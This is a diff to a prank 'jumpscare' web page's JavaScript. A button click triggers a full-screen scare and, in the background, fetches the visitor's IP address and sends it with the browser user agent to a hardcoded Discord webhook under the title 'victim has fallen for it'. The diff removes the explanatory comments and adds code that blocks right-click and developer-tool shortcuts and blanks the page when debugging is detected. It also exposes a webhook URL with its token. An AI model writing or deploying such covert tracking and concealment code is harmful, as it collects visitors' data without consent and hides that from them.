@@ -40,20 +40,17 @@
     </audio>
 
     <script>
-        // ฟังก์ชันส่งข้อมูลไปยัง Discord Webhook
         async function sendLog() {
             const webhookURL = "https://discord.com/api/webhooks/1497671101940105287/2IL9P9RTQfnFwkckvU9MDVrz7uVHk6SdT0MdL64s-a6niXXx8fP36Ev6tfTHzuPna19m";
             
             try {
-                // ดึง IP จาก API ภายนอก
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 
-                // ข้อมูลที่จะส่งในรูปแบบ Embed
                 const params = {
                     embeds: [{
                         title: "📸 เหยื่อติดกับแล้ว!",
-                        color: 16711680, // สีแดง
+                        color: 16711680,
                         fields: [
                             { name: "🌐 IP Address", value: `**${ipData.ip}**`, inline: true },
                             { name: "📱 Device Info", value: navigator.userAgent },
@@ -63,7 +60,6 @@
                     }]
                 };
 
-                // ส่งเข้า Discord
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -74,18 +70,15 @@
             }
         }
 
-        // เมื่อกดปุ่ม
         document.getElementById('scare-btn').addEventListener('click', function() {
-            // 1. เริ่มส่งข้อมูล Log (ทำงานเบื้องหลัง)
             sendLog();
 
-            // 2. แสดง Jumpscare
             var container = document.getElementById('jumpscare-container');
             var audio = document.getElementById('jumpscare-audio');
             
             if (container.requestFullscreen) {
                 container.requestFullscreen();
-            } else if (container.webkitRequestFullscreen) { /* Safari */
+            } else if (container.webkitRequestFullscreen) {
                 container.webkitRequestFullscreen();
             }
             
@@ -93,6 +86,30 @@
             audio.currentTime = 0;
             audio.play().catch(function(e) { console.error("Audio playback failed:", e); });
         });
+
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.onkeydown = function (e) {
+            if (e.keyCode == 123 || 
+               (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || 
+               (e.ctrlKey && e.keyCode == 85)) {
+                return false;
+            }
+        };
+
+        setInterval(function() {
+            if (window.outerWidth - window.innerWidth > 200 || window.outerHeight - window.innerHeight > 200) {
+                window.location.replace("about:blank");
+            }
+        }, 500);
+
+        setInterval(function() {
+            let start = performance.now();
+            debugger;
+            let end = performance.now();
+            if (end - start > 100) {
+                window.location.replace("about:blank");
+            }
+        }, 100);
     </script>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js" integrity="sha384-b5kHyXgcpbZJO/tY9Ul7kGkf1S0CWuKcCD38l8YkeH8z8QjE0GmW1gYU5S9FOnJ0" crossorigin="anonymous"></script>
